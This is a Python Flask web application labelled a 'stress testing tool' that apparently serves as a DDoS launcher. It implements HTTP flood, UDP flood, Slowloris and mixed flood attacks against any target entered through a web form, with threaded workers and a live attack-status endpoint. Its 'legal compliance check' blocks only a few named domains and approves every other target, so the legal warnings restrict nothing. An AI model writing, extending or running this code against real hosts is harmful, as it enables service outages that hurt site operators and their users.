from flask import Flask, render_template, request, jsonify
import threading
import time
import random
import socket
import os
from concurrent.futures import ThreadPoolExecutor
import requests

app = Flask(__name__)

# Store attack status
attack_status = {
    'is_running': False,
    'requests_sent': 0,
    'successful_requests': 0,
    'failed_requests': 0,
    'packets_sent': 0,
    'current_method': ''
}

class WebNetworkTester:
    def __init__(self):
        self.is_testing = False
        
    def ultra_http_flood(self, target, port, duration, threads_count):
        """HTTP Flood attack"""
        end_time = time.time() + duration
        
        def worker():
            while time.time() < end_time and self.is_testing:
                try:
                    response = requests.get(
                        f"http://{target}:{port}/?{random.randint(1000,9999)}", 
                        timeout=2,
                        headers={'User-Agent': self.get_random_ua()}
                    )
                    attack_status['successful_requests'] += 1
                except:
                    attack_status['failed_requests'] += 1
                attack_status['requests_sent'] += 1
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            futures = [executor.submit(worker) for _ in range(threads_count)]
            for future in futures:
                future.result()

    def enhanced_udp_flood(self, target, port, duration, threads_count):
        """Enhanced UDP Flood attack"""
        end_time = time.time() + duration
        packet_size = 1024
        
        def udp_worker():
            while time.time() < end_time and self.is_testing:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    # Generate random payload
                    payload = os.urandom(packet_size)
                    sock.sendto(payload, (target, port))
                    sock.close()
                    attack_status['packets_sent'] += 1
                    attack_status['requests_sent'] += 1
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            futures = [executor.submit(udp_worker) for _ in range(threads_count)]
            for future in futures:
                future.result()

    def slowloris_attack(self, target, port, duration, threads_count):
        """Slowloris attack"""
        end_time = time.time() + duration
        sockets = []
        
        def slowloris_worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((target, port))
                
                # Send partial headers
                headers = [
                    f"GET /?{random.randint(1000,9999)} HTTP/1.1\r\n",
                    f"Host: {target}\r\n",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                ]
                
                for header in headers:
                    sock.send(header.encode())
                    time.sleep(1)
                
                sockets.append(sock)
                
                # Keep connection alive
                while time.time() < end_time and self.is_testing:
                    try:
                        keep_alive = f"X-a: {random.randint(1000,9999)}\r\n"
                        sock.send(keep_alive.encode())
                        time.sleep(10)
                    except:
                        break
                        
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=min(threads_count, 200)) as executor:
            futures = [executor.submit(slowloris_worker) for _ in range(min(threads_count, 200))]
            for future in futures:
                future.result()
        
        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    def mixed_attack(self, target, port, duration, threads_count):
        """Mixed attack using multiple methods"""
        end_time = time.time() + duration
        
        def http_worker():
            while time.time() < end_time and self.is_testing:
                try:
                    response = requests.get(f"http://{target}:{port}/", timeout=2)
                    attack_status['successful_requests'] += 1
                except:
                    attack_status['failed_requests'] += 1
                attack_status['requests_sent'] += 1
        
        def udp_worker():
            while time.time() < end_time and self.is_testing:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    payload = os.urandom(512)
                    sock.sendto(payload, (target, port))
                    sock.close()
                    attack_status['packets_sent'] += 1
                    attack_status['requests_sent'] += 1
                except:
                    pass
        
        # Use half threads for HTTP, half for UDP
        http_threads = max(1, threads_count // 2)
        udp_threads = max(1, threads_count // 2)
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            # Start HTTP workers
            http_futures = [executor.submit(http_worker) for _ in range(http_threads)]
            # Start UDP workers
            udp_futures = [executor.submit(udp_worker) for _ in range(udp_threads)]
            
            # Wait for all to complete
            for future in http_futures + udp_futures:
                future.result()

    def get_random_ua(self):
        """Get random user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
        ]
        return random.choice(user_agents)

tester = WebNetworkTester()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/legal_warning')
def legal_warning():
    return jsonify({
        'warning': """
🚨🚨🚨 EXTREME STRESS TESTING TOOL 🚨🚨🚨

LEGAL WARNING:
- ONLY use on systems you OWN or have EXPLICIT WRITTEN permission to test
- Unauthorized use is ILLEGAL and can result in CRIMINAL CHARGES
- This tool can CAUSE SERVICE DISRUPTION and SYSTEM DAMAGE
- You accept FULL LEGAL and FINANCIAL responsibility for all consequences

TECHNICAL WARNING:
- Can generate EXTREME network load
- May trigger DDoS protection systems
- Could cause temporary or permanent service interruption
- May violate hosting provider terms of service

By using this tool, you confirm you understand and accept ALL risks and legal responsibilities.
        """
    })

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target = data['target']
    port = int(data['port'])
    duration = int(data['duration'])
    threads = int(data['threads'])
    method = data['method']
    
    # Legal compliance check
    if not self_attest_legal_compliance(target):
        return jsonify({'error': 'Legal compliance check failed. You must own or have explicit permission to test the target.'})
    
    # Reset status
    attack_status.update({
        'is_running': True,
        'requests_sent': 0,
        'successful_requests': 0,
        'failed_requests': 0,
        'packets_sent': 0,
        'current_method': method
    })
    
    # Start attack in background thread
    def run_attack():
        tester.is_testing = True
        try:
            if method == 'http_flood':
                tester.ultra_http_flood(target, port, duration, threads)
            elif method == 'udp_flood':
                tester.enhanced_udp_flood(target, port, duration, threads)
            elif method == 'slowloris':
                tester.slowloris_attack(target, port, duration, threads)
            elif method == 'mixed':
                tester.mixed_attack(target, port, duration, threads)
        except Exception as e:
            print(f"Attack error: {e}")
        finally:
            tester.is_testing = False
            attack_status['is_running'] = False
    
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'Attack started', 'legal_warning': 'You are legally responsible for proper use of this tool.'})

@app.route('/attack_status')
def get_attack_status():
    return jsonify(attack_status)

@app.route('/stop_attack')
def stop_attack():
    tester.is_testing = False
    attack_status['is_running'] = False
    return jsonify({'status': 'Attack stopped'})

def self_attest_legal_compliance(target):
    """
    Legal compliance self-attestation
    User must confirm they own or have permission to test the target
    """
    # This is a self-attestation mechanism
    # In a real implementation, you might want more robust checks
    forbidden_targets = [
        'google.com', 'facebook.com', 'github.com', 
        'vercel.com', 'cloudflare.com', 'amazon.com',
        'government domains', 'critical infrastructure'
    ]
    
    # Basic protection against obvious misuse
    for forbidden in forbidden_targets:
        if forbidden in target.lower():
            return False
    
    return True

if __name__ == '__main__':
    app.run(debug=True)
